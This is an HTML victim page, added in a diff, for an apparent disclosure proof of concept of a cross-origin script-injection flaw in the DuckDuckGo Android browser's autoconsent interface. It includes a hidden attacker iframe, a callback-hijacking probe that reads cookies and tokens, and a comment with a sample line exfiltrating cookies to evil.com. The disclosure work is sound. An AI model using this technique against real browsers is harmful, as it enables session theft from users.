@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SecureBank — Account Dashboard (UXSS PoC Victim)</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 860px; margin: 30px auto; padding: 16px; background: #f9f9f9; }
+    h1 { color: #1a237e; }
+    .card { background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 16px; margin-bottom: 16px; }
+    .card h2 { margin-top: 0; font-size: 1rem; color: #555; text-transform: uppercase; letter-spacing: 0.05em; }
+    .secure   { border-left: 4px solid #4caf50; }
+    .info     { border-left: 4px solid #2196f3; font-size: 0.9rem; }
+    .info code { background: #eee; padding: 2px 4px; border-radius: 3px; }
+    .log      { border-left: 4px solid #9c27b0; background: #111; color: #0f0; font-family: monospace; font-size: 0.85rem; min-height: 80px; }
+    .log h2   { color: #aaa; }
+    .hit      { background: #ffebee; color: #b71c1c; border: 1px solid #ef9a9a; padding: 8px; margin: 6px 0; border-radius: 4px; }
+    .ok       { background: #e8f5e9; color: #1b5e20; border: 1px solid #a5d6a7; padding: 8px; margin: 6px 0; border-radius: 4px; }
+    .neutral  { color: #aaa; margin: 4px 0; }
+    table     { width: 100%; border-collapse: collapse; }
+    td        { padding: 8px; border-bottom: 1px solid #eee; }
+    td:first-child { color: #777; width: 200px; }
+    .badge-vuln { background: #f44336; color: #fff; padding: 2px 8px; border-radius: 12px; font-size: 0.8rem; }
+    .badge-safe { background: #4caf50; color: #fff; padding: 2px 8px; border-radius: 12px; font-size: 0.8rem; }
+  </style>
+</head>
+<body>
+
+  <h1>🏦 SecureBank — Account Dashboard</h1>
+  <p style="color:#888;font-size:0.9rem">
+    <em>This page simulates a victim's authenticated banking session in the DuckDuckGo Android browser.
+    It is the <strong>top-level (main) frame</strong> — the origin whose context should be protected by the Same-Origin Policy.</em>
+  </p>
+
+  <!-- ── Sensitive data on the victim page ─────────────────────────────── -->
+  <div class="card secure">
+    <h2>Sensitive Session Data (target of the attack)</h2>
+    <table>
+      <tr><td>Account</td><td><strong>#4532-7891-0234-5678</strong></td></tr>
+      <tr><td>Balance</td><td><strong>$24,578.92</strong></td></tr>
+      <tr><td>Session cookie</td><td><code id="show-cookie">—</code></td></tr>
+      <tr><td>localStorage token</td><td><code id="show-ls">—</code></td></tr>
+    </table>
+  </div>
+
+  <!-- ── Explanation ────────────────────────────────────────────────────── -->
+  <div class="card info">
+    <h2>How this PoC works</h2>
+    <p>
+      The DuckDuckGo Android browser registers an <code>AutoconsentAndroid</code> JavaScript interface
+      on the WebView using <code>addJavascriptInterface()</code>. This makes the object callable from
+      <strong>every frame in the WebView</strong>, including cross-origin iframes — Android does not enforce
+      the Same-Origin Policy on <code>@JavascriptInterface</code> calls.
+    </p>
+    <p>
+      This page embeds a <strong>cross-origin attacker iframe</strong> (loaded from a different origin) below.
+      The attacker iframe calls <code>AutoconsentAndroid.process(initMessage)</code> — which requires no
+      authentication in the pre-fix code. Android's <code>InitMessageHandlerPlugin</code> processes the
+      message and calls:
+    </p>
+    <pre style="background:#eee;padding:10px;border-radius:4px">webView.evaluateJavascript(
+    "javascript:window.autoconsentMessageCallback(initResp, origin)", null
+)</pre>
+    <p>
+      <code>evaluateJavascript()</code> <strong>always executes in the main frame's JavaScript context</strong>,
+      regardless of which frame triggered the <code>process()</code> call. Our interceptor below
+      detects when this happens and logs what data is accessible — proving the UXSS.
+    </p>
+    <p>
+      <strong>Vulnerable version:</strong> <code>AutoconsentAndroid.process(message)</code> — one argument, no secret.<br>
+      <strong>Fixed version:</strong> <code>AutoconsentAndroid.process(message, secret)</code> — rejects any call
+      where <code>secret</code> doesn't match the per-session UUID stored in <code>window.autoconsentAndroidSecret</code>
+      (inaccessible from cross-origin iframes via SOP).
+    </p>
+  </div>
+
+  <!-- ── UXSS evidence log ──────────────────────────────────────────────── -->
+  <div class="card log">
+    <h2>UXSS Evidence Log</h2>
+    <div id="log-entries">
+      <div class="neutral">Waiting for attack from cross-origin iframe…</div>
+    </div>
+  </div>
+
+  <!-- ── Attack status ─────────────────────────────────────────────────── -->
+  <div class="card">
+    <h2>Attack Status</h2>
+    <div id="attack-status">Initialising…</div>
+  </div>
+
+  <!--
+    ══════════════════════════════════════════════════════════════════════
+    ATTACKER IFRAME — cross-origin content from the "evil" server.
+
+    In a real attack this would be an ad, analytics script, or any
+    third-party widget that the victim site happens to embed.
+
+    SETUP REQUIRED:
+      Replace the src below with the URL where you are hosting attacker.html
+      on a DIFFERENT origin from victim.html.  Example:
+        victim.html  → http://localhost:8080/victim.html
+        attacker.html → http://localhost:8081/attacker.html   ← src goes here
+
+      See poc/README.md for a one-command two-server setup.
+    ══════════════════════════════════════════════════════════════════════
+  -->
+  <iframe
+    id="attacker-frame"
+    src="http://ATTACKER_HOST:PORT/attacker.html"
+    width="1"
+    height="1"
+    style="border:0;position:absolute;top:-9999px;left:-9999px"
+    title="cross-origin attacker iframe (invisible)"
+  ></iframe>
+
+  <script>
+    /* ====================================================================
+       STEP 1 — Plant sensitive data on this page, as a real victim site
+       would have legitimate session cookies and tokens.
+       ==================================================================== */
+    document.cookie = 'bank_session=VICTIM_SECRET_SESSION_TOKEN; path=/';
+    localStorage.setItem('auth_token', 'VICTIM_AUTH_TOKEN_XYZ');
+
+    document.getElementById('show-cookie').textContent = document.cookie || '(cookie blocked by browser security policy — use HTTP)';
+    document.getElementById('show-ls').textContent     = localStorage.getItem('auth_token') || '(unavailable)';
+
+    /* ====================================================================
+       STEP 2 — Arm the UXSS interceptor BEFORE the DDG autoconsent bundle
+       is injected into this page.
+
+       When the DuckDuckGo browser processes injectAutoconsent(), it calls:
+         webView.evaluateJavascript("javascript:window.autoconsentAndroidSecret='<uuid>';", null)
+         webView.evaluateJavascript("javascript:<autoconsent-bundle-js>", null)
+
+       The bundle (userscript.js) defines:
+         window.autoconsentMessageCallback = (msg) => { autoconsent.receiveMessageCallback(msg); }
+
+       We intercept that assignment with Object.defineProperty. Our setter
+       wraps the original callback so we can observe when it is invoked.
+
+       When an attacker iframe calls AutoconsentAndroid.process(initMsg),
+       Android's InitMessageHandlerPlugin calls:
+         webView.evaluateJavascript("javascript:window.autoconsentMessageCallback(initResp, origin)", null)
+       in the MAIN FRAME's context — i.e., right here in victim.html's JS.
+       Our wrapper fires, logs the evidence, and reads the sensitive data.
+       ==================================================================== */
+
+    var _wrappedCallback = null;
+    var attackDetected   = false;
+
+    try {
+      Object.defineProperty(window, 'autoconsentMessageCallback', {
+        configurable: true,
+        enumerable:   true,
+
+        set: function (fn) {
+          /* The DDG autoconsent bundle just defined the callback in
+             THIS origin's context.  Wrap it with our evidence logger. */
+          _wrappedCallback = fn;
+
+          Object.defineProperty(window, 'autoconsentMessageCallback', {
+            configurable: true,
+            writable:     true,
+            enumerable:   true,
+
+            value: function uxssProbe(msg, origin) {
+              /* ── UXSS CONFIRMED ───────────────────────────────────────
+                 This closure is executing in victim.html's JS context.
+                 It was triggered by Android calling evaluateJavascript()
+                 in the main frame — which was itself triggered by the
+                 cross-origin attacker iframe's AutoconsentAndroid.process()
+                 call.  We now have full access to victim-origin data.
+                 ────────────────────────────────────────────────────── */
+              if (!attackDetected) {
+                attackDetected = true;
+                var stolenCookie  = document.cookie;
+                var stolenToken   = localStorage.getItem('auth_token');
+                var victimOrigin  = window.location.origin;
+                var msgType       = (msg && msg.type) ? msg.type : JSON.stringify(msg).substring(0, 60);
+
+                appendLog(
+                  '<strong>🚨 UXSS CONFIRMED</strong><br>' +
+                  'Code injected by cross-origin iframe is executing in victim origin: <strong>' + victimOrigin + '</strong><br>' +
+                  '<br>' +
+                  'Data accessible to the injected code:<br>' +
+                  '&nbsp;&nbsp;• document.cookie = <code>' + (stolenCookie || '(empty — use HTTP server)') + '</code><br>' +
+                  '&nbsp;&nbsp;• localStorage[auth_token] = <code>' + stolenToken + '</code><br>' +
+                  '&nbsp;&nbsp;• document.title = <code>' + document.title + '</code><br>' +
+                  '&nbsp;&nbsp;• autoconsentMessageCallback msg.type = <code>' + msgType + '</code><br>' +
+                  '<br>' +
+                  'In a real attack, all of the above would be exfiltrated to the attacker\'s server.',
+                  'hit'
+                );
+
+                setStatus('🚨 ATTACK SUCCEEDED — see evidence log above', '#b71c1c');
+
+                /* Simulate exfiltration that a real attacker would perform:
+                   In production exploit: new Image().src = 'https://evil.com/steal?d=' + encodeURIComponent(stolenCookie)
+                   We only log it here for safe demonstration. */
+                console.warn('[UXSS PoC] Cookie would be sent to attacker:', stolenCookie);
+                console.warn('[UXSS PoC] Auth token would be sent to attacker:', stolenToken);
+              }
+
+              /* Pass through to the real autoconsent handler so the app
+                 flow continues normally (keeps the demo stable). */
+              if (typeof _wrappedCallback === 'function') {
+                return _wrappedCallback.call(this, msg, origin);
+              }
+            }
+          });
+
+          appendLog('DDG autoconsent bundle injected into victim page — interceptor active.', 'ok');
+          setStatus('Autoconsent bundle injected. Waiting for attacker iframe…');
+        }
+      });
+
+      appendLog('Object.defineProperty interceptor armed — waiting for autoconsent bundle injection.', 'neutral');
+    } catch (e) {
+      appendLog('Failed to arm interceptor: ' + e.message, 'hit');
+    }
+
+    /* ====================================================================
+       STEP 3 — Listen for status messages from the attacker iframe.
+       (In a real attack the attacker would NOT signal the victim —
+        this postMessage channel is only for PoC UI feedback.)
+       ==================================================================== */
+    window.addEventListener('message', function (evt) {
+      if (evt.data && evt.data.pocType === 'attacker-status') {
+        appendLog('[Attacker iframe] ' + evt.data.text, 'neutral');
+      }
+    });
+
+    /* ── Helpers ──────────────────────────────────────────────────────── */
+    function appendLog(html, cls) {
+      var div = document.createElement('div');
+      div.className = cls || 'neutral';
+      div.innerHTML = '[' + new Date().toISOString() + '] ' + html;
+      var container = document.getElementById('log-entries');
+      container.appendChild(div);
+    }
+
+    function setStatus(text, color) {
+      var el = document.getElementById('attack-status');
+      el.textContent = text;
+      if (color) el.style.color = color;
+    }
+  </script>
+
+</body>
+</html>
